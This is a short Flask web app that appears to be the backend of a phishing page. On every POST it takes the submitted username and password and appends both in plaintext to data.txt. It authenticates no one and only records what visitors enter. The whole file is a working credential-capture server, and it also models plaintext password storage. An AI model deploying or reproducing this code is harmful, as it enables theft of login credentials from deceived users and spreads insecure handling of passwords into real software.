from flask import Flask, request
from flask.templating import render_template

app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        with open('data.txt', 'a') as f:
            f.write(f'Username is: {username} and password is: {password}\n')
    
    return render_template('index.html')

if __name__ =="__main__":
    app.run()